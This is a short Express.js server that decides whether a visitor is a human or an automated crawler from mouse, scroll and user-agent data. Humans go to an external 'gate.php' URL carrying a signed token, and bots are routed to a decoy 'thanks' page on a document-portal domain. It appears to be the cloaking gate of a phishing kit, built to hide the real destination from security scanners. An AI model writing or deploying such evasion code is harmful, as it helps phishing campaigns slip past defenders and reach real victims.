import express from "express";
import crypto from "crypto";

const app = express();
app.use(express.json());

const SECRET = process.env.RAILWAY_SECRET;

function score(metrics){
  let s = 0;
  if(metrics.mouse > 20) s++;
  if(metrics.scroll > 5) s++;
  if(!/Headless|Phantom/.test(metrics.ua)) s++;
  return s;
}

app.post("/verify-human",(req,res)=>{
  const { metrics } = req.body;
  const isHuman = score(metrics) >= 2;

  const payload = {
    human: isHuman,
    ts: Date.now(),
    nonce: crypto.randomBytes(8).toString("hex")
  };

  const token = Buffer.from(
    JSON.stringify(payload)
  ).toString("base64")+"."+
  crypto.createHmac("sha256",SECRET)
    .update(JSON.stringify(payload))
    .digest("hex");

  if(isHuman){
    res.json({
      ok:true,
      redirect:`https://api.adhket.icu/gate.php?trust_token=${encodeURIComponent(token)}`
    });
  } else {
    // bots get fake happiness
    res.json({
      ok:true,
      redirect:"https://documentportal.zoholandingpage.com/thanks"
    });
  }
});

app.listen(3000);
